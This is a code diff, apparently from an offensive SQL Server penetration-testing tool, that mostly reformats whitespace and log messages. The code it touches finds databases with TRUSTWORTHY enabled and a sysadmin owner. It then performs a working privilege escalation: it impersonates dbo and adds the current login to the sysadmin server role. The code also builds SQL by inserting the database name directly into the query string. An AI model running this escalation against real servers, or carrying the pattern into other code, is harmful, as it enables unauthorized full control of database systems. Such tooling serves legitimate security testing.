@@ -135,12 +135,12 @@ DECLARE @dbid INT;
 DECLARE @isDbOwner VARCHAR(3);
 
 DECLARE db_cursor CURSOR FOR
-SELECT 
+SELECT
     name,
     database_id,
     SUSER_SNAME(owner_sid) AS [Owner],
     is_trustworthy_on,
-    CASE 
+    CASE
         WHEN IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) = 1 THEN 'YES'
         ELSE 'NO'
     END AS [OwnerIsSysadmin],
@@ -155,12 +155,12 @@ FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSys
 WHILE @@FETCH_STATUS = 0
 BEGIN
     SET @isDbOwner = 'NO';
-    
+
     -- Check if current user has access and is db_owner in this database (only for ONLINE databases)
     IF HAS_DBACCESS(@dbname) = 1 AND @state = 'ONLINE'
     BEGIN
         BEGIN TRY
-            SET @sql = N'USE [' + REPLACE(@dbname, ']', ']]') + N']; 
+            SET @sql = N'USE [' + REPLACE(@dbname, ']', ']]') + N'];
                          SELECT @result = CASE WHEN IS_MEMBER(''db_owner'') = 1 THEN ''YES'' ELSE ''NO'' END;';
             EXEC sp_executesql @sql, N'@result VARCHAR(3) OUTPUT', @result = @isDbOwner OUTPUT;
         END TRY
@@ -168,12 +168,12 @@ BEGIN
             SET @isDbOwner = 'NO';
         END CATCH
     END
-    
+
     INSERT INTO @Results VALUES (
-        @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, 
+        @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin,
         @created, @state, @isDbOwner
     );
-    
+
     FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, @created, @state;
 END;
 
@@ -238,12 +238,20 @@ ORDER BY [Database];
                     logger.warning(
                         f"{exploitable} of {vulnerable} vulnerable database(s) are immediately exploitable (you are db_owner)"
                     )
-                    logger.warning("  Use 'trustworthy <database> -e' to escalate to sysadmin")
+                    logger.warning(
+                        "Use 'trustworthy <database> -e' to escalate to sysadmin"
+                    )
                 else:
-                    logger.info("  None are currently exploitable by your user (not db_owner)")
+                    logger.info(
+                        "None are currently exploitable by your user (not db_owner)"
+                    )
             elif any(row["Trustworthy"] for row in results):
-                logger.warning("Found databases with TRUSTWORTHY=ON but owners are not sysadmin")
-                logger.warning("  These are misconfigured but not exploitable for privilege escalation")
+                logger.warning(
+                    "Found databases with TRUSTWORTHY=ON but owners are not sysadmin"
+                )
+                logger.warning(
+                    "These are misconfigured but not exploitable for privilege escalation"
+                )
             else:
                 logger.success("No TRUSTWORTHY vulnerabilities detected")
 
@@ -267,6 +275,7 @@ ORDER BY [Database];
             True if successful, False otherwise
         """
         logger.info(f"Exploiting TRUSTWORTHY vulnerability on database '{database}'")
+        logger.info("This will escalate your current user to sysadmin")
 
         try:
             if database_context.user_service.is_admin():
@@ -282,7 +291,7 @@ ORDER BY [Database];
 
             escaped_db = database.replace("'", "''")
             db_props_query = f"""
-SELECT 
+SELECT
     d.name AS [Database],
     SUSER_SNAME(d.owner_sid) AS [Owner],
     d.is_trustworthy_on AS [Trustworthy],
@@ -310,24 +319,22 @@ WHERE d.name = '{escaped_db}';
 
             # Check if vulnerable
             if not trustworthy or not owner_is_sysadmin or not is_db_owner:
-                logger.error("Database is NOT vulnerable to TRUSTWORTHY escalation!")
-
                 if not trustworthy:
-                    logger.error("  TRUSTWORTHY is OFF")
+                    logger.error("TRUSTWORTHY is OFF")
                 if not owner_is_sysadmin:
-                    logger.error(f"  Database owner '{owner}' is not sysadmin")
+                    logger.error(f"Database owner '{owner}' is not sysadmin")
                 if not is_db_owner:
-                    logger.error("  Current user is not db_owner")
+                    logger.error("Current user is not db_owner")
 
                 return False
 
-            logger.info(f"  Escalating user '{current_login}' to sysadmin")
+            logger.info(f"Escalating user '{current_login}' to sysadmin")
 
             exploit_query = f"""
 USE [{database}];
 EXECUTE AS USER = 'dbo';
 ALTER SERVER ROLE sysadmin ADD MEMBER [{current_login}];
-SELECT 
+SELECT
     '{current_login}' AS [Login],
     IS_SRVROLEMEMBER('sysadmin', '{current_login}') AS [IsSysadmin];
 REVERT;
@@ -342,7 +349,7 @@ REVERT;
                     if escalated:
                         logger.success(f"User '{current_login}' is now SYSADMIN!")
                         logger.success(
-                            f"  ALTER SERVER ROLE sysadmin DROP MEMBER [{current_login}];"
+                            f"ALTER SERVER ROLE sysadmin DROP MEMBER [{current_login}];"
                         )
                         return True
 
